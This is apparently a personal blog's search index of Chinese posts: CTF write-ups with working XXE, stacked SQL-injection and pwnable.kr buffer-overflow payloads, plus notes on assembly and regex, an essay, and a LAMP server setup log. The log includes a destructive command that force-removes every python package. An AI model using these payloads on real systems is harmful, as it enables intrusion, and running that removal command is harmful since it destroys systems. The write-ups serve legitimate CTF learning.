<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[2019网络与信息安全领域专项赛wp]]></title>
    <url>%2F2019%2F08%2F16%2F2019%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%A2%86%E5%9F%9F%E4%B8%93%E9%A1%B9%E8%B5%9Bwp%2F</url>
    <content type="text"><![CDATA[没能打进线下，记录一下除队友做的外我做的几道，留作温习。 签到题nslookup -q=TXT gamectf.com game在cqg.js中有发送ajax。 if(score == 15){ $.ajax({ url: &#39;score.php&#39;, type: &#39;POST&#39;, data: &#39;score=&#39;+score, success: function(data){ var data = data; $(&quot;#output&quot;).text(data); } }) } 直接向score.php post score=5即可得到flag whoareyou抓包发现发送了xml请求，输入&amp;加任意字符报错，联想到XXE漏洞，payload如下：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT author ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot; &gt;]&gt;&lt;feedback&gt;&lt;author&gt;&amp;xxe;&lt;/author&gt;&lt;/feedback&gt; flag就在源码内 七代目gif修复，加上文件头后逐帧分离，得到flag 亚萨西压缩包winhex打开发现文件尾密码，解开压缩包，分离包内图片，放入stegsove，得到ook编码，解码即为flag。 24word图片为核心价值观编码，解码结果为压缩包密码，压缩包内有图片，扫描二维码可得flag。 sm4用题目所给直接密文、密钥转16进制，再解密即可得flag。]]></content>
  </entry>
  <entry>
    <title><![CDATA[一道存储过程绕过的SQL注入题]]></title>
    <url>%2F2019%2F07%2F04%2FSQLstore%2F</url>
    <content type="text"><![CDATA[题目来源：BUUCTF上一道强网杯的原题——《随便注》题目链接：http://web16.buuoj.cn/ 题目是一个查询，输入1，2有回显，说明存在column1，2. 输入1&#39;报错，初步判断应该是sql注入。 输入1&#39;;show tables发现有两个表，并且存在堆叠注入漏洞。 输入1&#39;;show column from 1919810931114514，发现无回显，经查询发现数字字符串需加上反引号。可以看到flag column在该表内。 直接上select想拿flag，发现被过滤下来了。 无头绪中，发现该大佬的博客，地址：https://blog.csdn.net/weixin_37839711/article/details/81562550，学会了存储过程绕过。 于是最终payload：1&#39;;sEt @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare ctf from @a;execute ctf; 存储过程绕过的原理，就是用prepare将from后面的语句暂存，该语句可以是16进制的，也可以含有参数。set 可以存储一个数值到变量里面，execute执行prepare的语句。 所以这里我们将select * from `1919810931114514`转换为16进制，然后放进set的变量里，prepare后excecute，成功执行。 为了进一步验证16进制可以执行的猜想，我们进一步测试了另外一个表words，然后…… 发现了彩蛋（逃]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lpc的pwnable.kr日记(2)]]></title>
    <url>%2F2019%2F06%2F28%2Flpc%E7%9A%84pwnable-kr%E6%97%A5%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[[passcode]12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf(&quot;Login OK!\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\n&quot;); return 0;&#125; 这道题主要包含两个知识点： 1.scanf不加取地址符的时候，如果后面那个参数不是地址型的参数，那么就从栈中读取4个字节作为scanf取的地址。 2.GOT表覆写。关于GOT表覆写，大佬的这篇文章已经讲得很清楚了：https://blog.csdn.net/smalosnail/article/details/53247502 关于GOT表的知识，见这位dalao的博客： https://blog.csdn.net/linyt/article/details/51635768 解题思路就是，把GOT表中某个函数的地址写进栈中，以充当scanf的地址，写入的内容是system函数的地址，在该函数运行的时候，调用system函数。 payload： 12passcode@prowl:~$ python -c &quot;from pwn import *;payload = &apos;A&apos; * 96 + p32(0x0804a000) + str(0x80485e3);print(payload)&quot; | ./passcode Toddler’s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :) [random]123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf(&quot;Good!\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; &#125; printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;); return 0;&#125; 解题关键：利用伪随机数rand()初始化时不设种子，每次都是同一个值的特点。 random@prowl:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable…]]></content>
  </entry>
  <entry>
    <title><![CDATA[lpc的pwnable.kr日记(1)]]></title>
    <url>%2F2019%2F06%2F27%2Flpc%E7%9A%84pwnable%E6%97%A5%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[非常喜欢pwnable.kr，题目难度循序渐进，关键是界面可爱到爆QAQ 第一题 fd123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(&quot;pass argv[1] a number\n&quot;); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123; printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); &#125; printf(&quot;learn about Linux file IO\n&quot;); return 0;&#125; 这就是一个很简单的传参问题，argv数组接受main函数（也就是运行程序时后面带的参数），按照题目要求传参，fd为1作为read的第一个参数，buf接收LETMEWIN即可。 fd@prowl:~$ lsfd fd.c flagfd@prowl:~$ ./fd 4662LETMEWINgood job :)mommy! I think I know what a file descriptor is!! 第二题 collision12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(&quot;usage : %s [passcode]\n&quot;, argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(&quot;passcode length should be 20 bytes\n&quot;); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(&quot;/bin/cat flag&quot;); return 0; &#125; else printf(&quot;wrong passcode.\n&quot;); return 0;&#125; 输入20个char型的，在check_password里转成int型的，原来一个字符指针对应一个字节，现在变成int指针对应4个字节，长度为5，刚好满足循环累加，加起来要等于0x21DD09EC。 4个字符存一个16进制的int。hashcode = 4*a+b = 16*char+b。 0x21DD09EC = 0x01010101*4+0x1dd905e8 考虑小端序，payload为 1`python-c &quot;print &apos;\x01&apos; * 16 +&apos;\xE8\x05\xD9\x1D&apos;&quot;` col@prowl:~$ ./col `python -c “print ‘\x01’ * 16 +’\xE8\x05\xD9\x1D’”`daddy! I just managed to create a hash collision :) 第三题 bof123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system(&quot;/bin/sh&quot;); &#125; else&#123; printf(&quot;Nah..\n&quot;); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 拖进ida，func函数里面，overflowme的地址为ebp-2c，key的地址为ebp+8，0x2c + 0x8 = 52。 简单的栈溢出，payload如下： 12345# -*- coding:utf-8 -*- import pwnr = pwn.remote(&apos;pwnable.kr&apos;,9000)r.send(&apos;a&apos;*52+pwn.p32(0xcafebabe))r.interactive() 第四题 flag拖进ida，找不到main函数的入口点，根据题目提示reverse，估计加壳，peid查壳发现upx，kali upx -d 脱壳，再拖进ida即可发现flag。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019信安国赛部分wp]]></title>
    <url>%2F2019%2F04%2F23%2F2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[​ 人生中第一次参加信安国赛……之前是偶尔打打CTF的菜鸡，不太知道自己的斤两，这次国赛让我见识到什么是神仙打架。 ​ 比较菜，没做出几道题，写个wp，权当自己复习纪念。 ​ 不够啊，还要努力。 签到下载题目花了5分钟（即使我是尊贵的百度云vip会员）。突然榜上一分钟内就有大佬做出来了？（一定是我钱充得不够） 拿到题目一看，三人行，必有flag。打开题目，一个摄像头，可以捕捉脸部（出现小框框的那种），联想到三人行，就三个人一起看摄像头。当时比较simple，把控制台最小化了，弄半天没反应，最后气急败坏要关闭题目的时候，看见控制台里的flag。 签到完成。 babypwn这题一开始以为是简单题，太乐观了。直接栈溢出后。。。额，就找不到可以利用的点了，找不到system、write，找不到int 80 gadget，无从下手。打算直接给read加上libc的system偏移，尝试一波后放弃。然后在网上找了找解决方案好久，看到一道类似的题，是2017年的文章，（https://veritas501.space/2017/04/23/32%E4%BD%8D%E4%B8%8B%E8%8A%B1%E6%A0%B7read_write/）是说把got表里的read低字节覆盖成syscall地址，然后看大概的代码结构也和题给的差不多，似乎出题人就是把这道题稍微改了一下。然后我复现了一下这道题，整个跳csu_init，写bin/sh，跳plt_read的过程还好，就最后一个覆盖低字节\xdc很迷。 以为偏移指的是函数间的偏移，发现偏移都差距好大，觉得是libc不同的过。好久才醒悟过来syscall的偏移是在read函数内的，然后就确定偏移的确是\xdc了，然后就是把eax、ebx的相应参数都设置好，用两个gadget。之后以为能成功，但本地一直报段错误，不知道为啥。想碰碰运气试远程结果成功了。 写的脚本： puzzles根据likes提示格式，我们开始一步一步地解。 question0是一个一元多阶多项式方程组，不多说，上matlab： question1发现都是奇数，等比数列无果后操作了一波发现是质数。于是，依然matlab： 发现是不连续的质数，然后查看了一波质数的位置，发现第一个在1645834位，第三个在1645908，第四个在1645945，等差数列，于是第三个质数为1645908。 question2依然matlab： 定积分公式 question3物理题 网上找到了原题，改下数字，带公式计算。 question4数学题 依然matlab： 最后把几个part转换成16进制，拼接起来，得到flag saleae下载下来是一个logicdata后缀的文件，不知道的后缀名先百度一波。发现有这样一篇文章（https://www.waitalone.cn/security-hardware-usb.html），发现要用到一个叫saleae logic的软件，再联想到题目，就很顺理成章了。 去官网下载一波，打开，发现是三个波形，一开始我们以为是条形码。 于是就开始疯狂的扫扫扫，然鹅： 后来仔细观察了下波形： channel0这规律的波形，这熟悉的律动。联想到学过的数电的时钟信号 ，想到了时序分析。所以analyze采用SPI时序分析。时钟设为channel0，使能端用channel3，channel1没有起伏可以不用管，channel0是被分析的所以设为MOSI，于是乎： 右下角得到分析结果，0x66是字符‘f’，0x6c是字符‘l’，flag出来了。 usbasp操作内容有了昨天物联网那道题的经验，依旧用saleae打开。 channel2放大后看起来比较有规律。尝试用channel2做时钟端口，channel1和0做被分析，channel3做使能端。发现好像不行 然后看到题目，联想到用usb协议，发现依旧不行。 然后抱着试一试的心态和认定0x66和0x6c的心态去试了下每个协议，终于，在时序分析spi时，把使能端的设置改一下 然后惊喜地发现了0x66，于是转换一下，即得flag。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言学习心得（二）：Debug、DS寄存器、字]]></title>
    <url>%2F2019%2F02%2F05%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9ADebug%E3%80%81DS%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E5%AD%97%2F</url>
    <content type="text"><![CDATA[在王爽老师的《汇编语言》一书中，提到了debug这一工具。Debug是dos和windows都提供的一种程序调试工具，使用它，可以查看寄存器和内存的内容。并且可以修改，写入，执行汇编、机器指令。 Win10的电脑已经不再支持command指令和debug工具，方法一是在网上下载dosbox以及debug.exe配合使用。也可以采用vmware+windowsxp的虚拟机来使用debug工具。接下来枚举一下debug的主要指令以及功能。 -r 该命令用来显示、改变寄存器的内容。如 -r ax 可以改变寄存器ax的内容，也可以-rax不带空格。 -d 该命令用来显示内存中的内容，默认显示左下角地址为起始位置的128个内容。后面可接地址，如-d 1000：0，则显示段地址为1000，偏移地址为0的起始地址的内容。 -e 该命令用于修改内存中的内容，后接地址，格式同-d命令。 -u命令可将内存中的机器指令翻译成汇编指令，默认为左下角地址所指内存。可指定内存，格式同-d命令。 -t 命令可执行一条机器指令，执行的命令为CS 和IP中的地址指向的命令，后面不可指定地址。 -a 命令可以向内存中以汇编指令的形式写入指令，默认为-r左下角地址，可指定地址，格式同-d命令。 在写入命令时，既可以用-e直接修改内存中的机器码，也可以用-a写入汇编代码。写入内存地址后，-t执行的是CS IP中的地址，所以要先用-r命令修改CS IP为待执行地址，再使用-t执行。 字由两个字节构成，所以在8086CPU中，每个字用16位寄存器储存。高位放在高地址单元，低位则放在低地址单元里面。 8086CPU里面，有一个寄存器叫做DS（段寄存器），用于存放数据的段地址。CS也是段寄存器，不过为了区分，CS段寄存器专门用来存放指令，而DS存的是不可执行的数据。 当执行汇编指令 mov AX,[1]时，中括号内的内容其实是当前的偏移地址，那么如何确定段地址呢？此时的段地址即为DS寄存器内存储的地址。 当修改段寄存器的地址时，我们容易想到使用 MOV DS,3333H的语句。这样的操作叫做“立即寻址方式”，被传送的数据叫做立即数。但实际上这样做是非法的，因为CPU不支持直接将立即数送入段寄存器。Google给出的原因是由于立即数直接写入段寄存器这样的指令，被翻译成机器码之后将占用更多的字节，在事先规定的指令长度范围内无法存贮下这么多的内容，因此改由先写入通用寄存器，再由通用寄存器写入段寄存器的办法代替。立即数实际上是相当占地方的。只能通过间接迂回的方式。MOV AX,3333H MOV DS,AX。先将数据送入一般寄存器，再把一般寄存器的值送入段寄存器。 数据从寄存器到内存地址的方式是内存地址到寄存器的逆过程，只需MOV [0],AX即可。 因为8086CPU是16位结构，可以一次性传输16位数据，也就是一个字的数据。]]></content>
  </entry>
  <entry>
    <title><![CDATA[优美的舞姿--探索正则表达式（一）：字符组、量词初步]]></title>
    <url>%2F2019%2F02%2F04%2F%E4%BC%98%E7%BE%8E%E7%9A%84%E8%88%9E%E5%A7%BF-%E6%8E%A2%E7%B4%A2%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%AD%97%E7%AC%A6%E7%BB%84%E3%80%81%E9%87%8F%E8%AF%8D%E5%88%9D%E6%AD%A5%2F</url>
    <content type="text"><![CDATA[前几天看《编译与反编译原理》，词法分析器的编写用到了正则表达式；以前写爬虫，对获取到的庞大的数据进一步地筛选，提取有用信息，也是离不开正则表达式。一直以来对正则都是一知半解，这几天，读了余晟老师写的《正则指引》，颇有心得，取其主干和精彩处总结一下，权当自己复习。 正则表达式，又称为规则表达式，英语是Regular Expression，所以常常简写为RE。最早是用在unix指令sed和grep里。Grep，G、re、p，中间的re正是指正则表达式。 认识正则表达式的第一步，是认识字符组。它表示在同一位置可能出现的各种字符。常常包含在一对方括号[]之间。而方括号中的内容则表示要匹配的内容。如[123]则匹配数字1，2，3。[a,b,c,d,e,f,g]则匹配字母a,b,c,d,e,f,g。 那么当要匹配的范围扩大，比如要匹配所有的字母，总不能把所有的单词全部写一遍吧。我们知道，每个ASCII字符都能对应一个ASCII码。所以，我们只需要按照ASCII码的顺序并结合‘-’符号构造一个范围表达式，如[0-9]就代表所有的数字，[a-zA-Z]就代表所有的英文大小写字母。然而当‘-’符号并不是作为两个ASCII字符的连接符时，则保持原有的意思，如[-09]代表匹配数字0，9以及符号‘-’。 如果我们要匹配不为A的所有字符呢？这时候用一个排除型字符组就可以解决。排除型字符组和普通字符组最大的不同是含有一个脱字符‘^’，如，不含A的所有字符可以表示为[^A]。 正则表达式的字符组本质上是一个集合，所以可以进行集合的运算。如，进一步，我想匹配不为F的所有大写字母，则可以写作[A-Z-[\^F]],即从A-Z匹配到的大写字母的集合里面，进行差集运算，减掉字母F。 特殊字符组：POSIX字符组。以及PCRE简记法。如[0-9]在POSIX字符组里面可以表示为[:digit:]，在PCRE里面简记为\d。常用的简记还有\s（空白字符），\w（字母字符）。 而简记法字符的排除型可以用他们的大写形式来表示，如：\S表示不为空白字符的所有字符。因此，我们可以用[\s\S]、[\W\w]、[\D\d]来表示所有字符（突然想起sql注入的时候为了绕过等号采用&lt;&gt;号，原理大同小异）。有的时候还可以用’.’字符来匹配，然而点字符无法匹配换行符。 一个字符组匹配一个空位的字符，那么，当我们要匹配多个字符时，如果将字符组重复写多次，未免显得太笨拙繁琐。正则表达式为我们提供了一个量词符号{}。如\d{4}代表匹配数字4次，等价于\d\d\d\d。同样，{}符号可以写成范围形式，代表匹配左闭右闭区间的范围次数，如{5,6}，则代表匹配5次或6次。有趣的是，这个区间可以单独缺少上区间或者下区间。如{5,}代表匹配不止5次，{,6}代表匹配最多6次，最少0次，但在有些语言下不适用，应该注意。 同样，量词也提供了简单写法，如+符号代表匹配不止1次，等同于{1,}，*符号代表匹配大于等于0次，等同于{0,}，？则代表匹配0次或1次，等同于{0,1}。 在严格匹配字符串的长度，以及要求一一相等时，应该采用^$符号，表示从字符串首匹配到尾。 之前提到匹配任意字符串时，可以采用’.’符号，然而点符号并不能匹配换行符\n，除非在单行匹配模式下。同时，点号时匹配优先词，采用的是贪婪模式匹配，所以在一些情况下可能会出现问题。 下一篇将探索贪婪模式与非贪婪模式匹配。]]></content>
  </entry>
  <entry>
    <title><![CDATA[汇编语言学习心得（一）：CPU,寄存器]]></title>
    <url>%2F2019%2F02%2F03%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9ACPU-%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[汇编语言是怎么产生的？汇编语言是机器指令的助记符，与机器指令一一对应。而对不同的CPU来说有不同的汇编指令集。显然，机器语言虽然高效，但是难以让人理解，可读性和查错性都不强，所以才出现了中间语言——汇编语言。 寄存器是CPU中存储数据的器件，一个CPU可以有多个寄存器。寄存器又有自己的代号，如AX,BX。说到数据，在内存和磁盘上，指令和数据的区别并不大，本质上都是作为二进制存储，但是CPU工作的时候，指令和数据则有不同的意义。 存储器包含若干个存储单元，每个单元从0开始编号。一个单元存储8bit，也就是一个字节Byte。但是在量度存储器的容量时，常常用字节作为最小的单位。CPU在读写存储器时，是按照：寻址——选择控制——读写的顺序进行工作的。而参与这一过程的主角——三条线：地址线、数据总线、控制总线，它们的作用分别如下： 地址线：CPU含有地址线的数量称为地址总线的宽度，于是寻址的范围就是2的宽度次方个存储单元。数据总线：一根数据总线对应一个二进制位（1bit），8根数据总线可以传输一个字节。控制总线：宽度决定CPU对外部器件的控制能力。 而可寻内存单元构成的叫做CPU的内存地址空间，分别由两个字节组成：高位字节和低位字节。 前面我们谈到不同的CPU对应不同的汇编指令，以及不同的寄存器数量。在这里我们着重介绍一种重要的CPU：8086CPU。 8086CPU由20位地址总线组成，具有1MB寻址能力。16位结构，一次性处理传输暂存的数据位16位。内部则用两个16位地址（段地址和偏移地址）通过地址加法器合成一个20位的物理地址。合成方式为：16*段地址+偏移地址。充分体现了用两个少位单元代替多位单元的思想。同时，正因为这个物理地址一个合成的地址，所以可以有不同的段地址和偏移地址的组合方式。 段地址和偏移地址是怎样暂时存储的呢？这里有两个重要的寄存器：CS寄存器和IP寄存器。前者储存段地址，称为代码段寄存器，后者储存偏移地址，称为指令指针寄存器。所以，我们基本上可以想象出执行一条指令的全过程了：CS和IP中的值送入地址加法器，计算出物理地址：16*CS+IP，然后用得到的物理地址传入输入输出控制器，通过地址总线寻找到指令的首地址，然后通过数据总线送回来，再送入指令缓冲器，这时候，我们的IP寄存器加上代码段长度的地址长度，指向下一个指令后，再执行当前指令，执行完后进入下一个循环，周而复始。 由此，我们知道，读取指令，不过就是改变CS和IP的值，使物理地址指向我们想要读取的指令集。那么怎么改变CS和IP的值呢？用MOV指令可以吗？ 我们知道，MOV可以修改寄存器AX，BX等寄存器的值，然而，在8086CPU中，MOV指令不能直接修改CS、IP内容，因为MOV指令叫做传送指令，只能通过执行指令前完成IP加上代码段长度这一个自增过程实现间接改变IP寄存器的值。能直接修改CS,IP的指令叫做转移指令，如JMP。 格式为JMP 段地址：偏移地址。 若仅仅修改IP内容，就用jmp 寄存器（AX,BX） 这一格式的语句。寄存器的值作为IP的新值。所以从某种意义上来说，jmp ax等同于mov ip ax。]]></content>
  </entry>
  <entry>
    <title><![CDATA[年]]></title>
    <url>%2F2019%2F01%2F30%2F%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[我越来越不喜欢过年。 上下半年的纷忙，年前的疲累，似乎不妨碍人们把最后的力气在热闹里燃尽。西门的灯笼挂起来了，遮住了整条街的穹顶，连梧桐与黄槲的阴影都要比往日更加分明。门庭变得热闹，往日希有来往的亲朋也纷至赴这盛宴。 这热闹表面上粉饰得红火，骨子里却是冷清的，冷到眼角发红，瞳孔扩张。它是三大姑嘴里发了横财锦衣夜行的某某，又是八大舅饭桌上吐出的将散未散的烟圈，是彻底忘却陈年的酒盏，终究在中年男人夹杂着咒骂的酒嗝中烟消云散。 这几天小雨。 一个人在家，或沉默，或翻着老物件自言自语。孩提时代不知被哪位长辈告诫，自言自语的小孩长大后会变成街上的疯子，这一点我当时确信不疑的。直到后来才知道不过是大人教小孩学会倾诉的一个计俩。只不过小时候那点心事谁都能付之衷肠，反倒是长大后自言自语的时候多了，于是我便很难分辨自己是否仍然正常。 人们为什么喜欢过年，是偏爱热闹，抑或是在那推杯换盏中忘却陈年？于是那咒骂声也仿佛立马有了现代极简主义感。我翻着这些或新或旧的礼物，字迹已然不清的贺卡，瓷储蓄罐，去年收到的一幅画。科学说人们会选择性地忘掉悲伤的回忆，男人告诉你忘不掉的能借助酒精，女人说还有口红和包。我已经大半年不饮一滴酒，我想我最好还是保持清醒。 比起过年，年终总结好像是个不错的替代方案。 好了，我要提笔了，诸君请看。可是，从何说起呢？上半年的事我大抵已经记不清了，下半年又太过压抑。这的确是很重要的半年，始于期待与一场狂喜，结束于疲惫与怅然。我在等待了一度春秋，等到那夏露结成一颗明珠，我攥了一整颗终于在孟秋失去，再不复得。深秋初冬的忙碌是密不透风的棺材板，当我终于从那板子里脱出，也快要忘却那盛夏的光景时，我的输入法还记得，它一遍又一遍地用曾经最平常不过的字眼来鞭挞我的心，痛斥我曾轻浮与薄情;歌单记得，便签纸记得，礼品记得，空间里我曾写下的那些稚气煽情的句子，全都还记得。 我于是终于还是向年妥协，斟一杯消愁的酒，就让这一年的光景全都熄灭在你迷离的醉眼里罢。]]></content>
  </entry>
  <entry>
    <title><![CDATA[我与Lamp模式建站的恩怨情仇]]></title>
    <url>%2F2019%2F01%2F14%2F%E6%88%91%E4%B8%8ELamp%E6%A8%A1%E5%BC%8F%E5%BB%BA%E7%AB%99%E7%9A%84%E6%81%A9%E6%80%A8%E6%83%85%E4%BB%87%2F</url>
    <content type="text"><![CDATA[很久没有更新我的博客，前几天网站突然不能访问，在排查原因无果之后，决定初始化我的磁盘，重新搭建我的博客。我是个爱折腾的人，当然循规蹈矩地安装lamp搭建博客基本上驾轻就熟，这一次我决定解决上次建站遗留下来的几个坑： 1.上次建站用的是centos自带的yum源，php5，apache2.4.6，以及mysql5，这一次我决定统一换成php7+mysql8。2.网站https化。3.让网站更加安全。 物料： 1.云服务器一台（centos系统）2.Typecho博客最新稳定版安装包一个3.手和脑子 首先，更新系统好习惯 sudo yum install update sudo yum install upgrade 接下来，配置防火墙我的感受就是：不要图省事直接关防火墙！虽然阿里云服务器防D防扫功能已经做得很好了，但是风险还是存在的。开启防火墙服务： systemctl start firewalld查看防火墙状态： systemctl status firewalld开机启动：systemctl enable firewall Tips：systemctl的这三个指令在centos7+版本改变服务状态很有用，可以记一记。 接下来，进行Apache的安装这里，我偷懒就直接yum install httpd了,这时候安装下来的是centos自带的apache2.4.6版本，不过，这里的省事也给我之后造成了不小的麻烦。 安装完成之后，我们开启apache服务 service httpd start 查一波状态 service httpd status 如果看到一个绿色的running小圆点，就说明服务搭建好了，这时候我们访问我们的公网ip，就能看见喜闻乐见的apache running 的页面了。 接下来，进行mysql的安装没有直接yum install，而是去官网下载了mysql最新版的rpm源然后执行rpm -ivh进行安装 然后它告诉你mysql的默认缺省密码的存储位置，我们直接cat拿到密码，然后 mysql -u -root 输入密码，然后重新为数据库设置新的密码。 完成后，我们新建一个名为typecho的数据库 Create database typecho 然后使用grant privilege赋权exit～ 那么mysql服务就安装到这里。 接下来安装phpYum源提供的php是5.7版本的，但是我选择去官方源下载php7的版本，这里安装方式不再赘述，网上一搜一大把。 下载typecho去typecho官方网站wget下载最新稳定版安装包，tar解压，再把build文件夹里面的东西mv到/var/www/html 目录下。 这时候，访问公网ip，看到安装程序，一切正常。 我们的坑正式来了。 第一个坑：连不上数据库 数据库创建了，死活连不上，让你检查配置。我们打开myql数据库 use mysql; select user,plugin from user ; 我们可以看到，列出来的用户里面，加密方式为caching_sha2_passwordTypecho默认数据库连接不支持sha2加密方式，我们改为native加密模式 ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;root&apos;; 然后修改密码 第一个坑顺利解决 安装完网站，进后台，进行各种设置，这时候，看到我们的域名http://wutongdeng.cn作为一名资深强迫症患者，chrome和火狐再给我丢一个不安全，就十分难受。不用说，https化。上次搭建因为mysql版本问题没能成功解决（一个很奇怪的报错条件）开始。我首先选择的是certbot，一个免费证书颁发网站（白嫖党上线）。网站虽然是英文的，但是有点英语基础安装起来没有困难，况且每一步的安装命令都给了，我们ctrl c ctrl v就能解决（额好吧，linux应该shift insert）。抱着这种心态，一路配置下去，突然卡在了 sudo yum install python2-certbot-apache 这一步上。安装的过程始终报错，后来才发现是python版本冲突的问题，这时候我想都没想干了一件蠢哭自己的事情 rpm -qa|grep python|xargs rpm -e --allmatches --nodeps whereis python|xargs rm -fr 然后我们再whereis python没有回显，说明python卸载干净了，我们再高高兴兴地sudo yum install python2-certbot-apache这时候，屏幕显示，yum不可用了。网上一查，yum和python有千丝万缕的联系，删除了python，yum就不能正常使用。喵喵喵？一个基于yum仓库，一个基于pip仓库，你俩怎么就有py关系了？虽然不服，还是接受了事实，决定把yum和python都删得干干净净然后重新安装。方法是去阿里云，163,以及ustc或者清华的镜像站去找rpm源，方式也是wget +rpm有依赖关系的要放在一块儿安装。恢复之后，sudo yum install python2-certbot-apache成功，然后接着 yum-config-manager --enable rhui-REGION-rhel-server-extras rhui-REGION-rhel-server-optional 这时候，系统提示，找不到yum-config-manager。网上找了大部分方法都没有解决这个问题，我干脆就直接把虚拟机上同版本的centos系统里的yum-config-manager拷贝过来。再执行命令，成功。 然后sudo certbot --apache 按照提示配置证书，这时候配置完了之后，又回显失败了。排错了很久也没有找到原因（感觉可能和我卸载yum和pip重装有关系） 我再次投向了腾讯爸爸的怀抱。 登录腾讯云平台，申请ssl证书，按照它的步骤走，什么放密钥在根目录，十分清晰明了。认证很快，邮件通知，然后到平台上下载你的证书文件进入/etc/httpd/conf.d 修改ssl.conf文件，把里面证书文件的缺省名称换为你的证书文件的位置，并且正确放置证书。重启apache服务，这时候我们可以看到网站已经能够https访问了，但是仍然能够以http的方式访问，显然不够完美。我们修改/etc/httpd/conf 里面的http.conf 文件，把网站根目录的overwrite功能打开（网上大部分的教程都是rewrite，但我死活没有找到，可能apache的版本导致的）这时候，我们利用rewrite功能在根目录写一个.htaccess文件如下： &lt;IfModule mod_rewrite.c&gt; Options +FollowSymlinks -Multiviews RewriteEngine On RewriteCond %{SERVER_PORT} 80 RewriteRule ^(.*)$ https://%{SERVER_NAME}/$1 [R=301,L] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1] &lt;/IfModule&gt; 文件会监听80端口，并且301重定向到https的网站，重启apache服务，输入http的域名，成功定向到https的域名。至此，https化成功。 那么如何让你的博客更加安全呢？为此，我做了以下几个改变：1.改变网站后台文件地址（名称需要非常复杂），并且设置ip白名单。2.网站目录重命名，并且apache配置禁止访问3.全站开启静态化。4.伪造了一个假的admin页面，用于愚弄脚本小子们。（之后想进一步学习蜜罐陷阱的布置方法，也算是开了一个小头了吧。） 2019年1月14日傍晚]]></content>
  </entry>
  <entry>
    <title><![CDATA[旧曾谙]]></title>
    <url>%2F2018%2F11%2F19%2F%E6%97%A7%E6%9B%BE%E8%B0%99%2F</url>
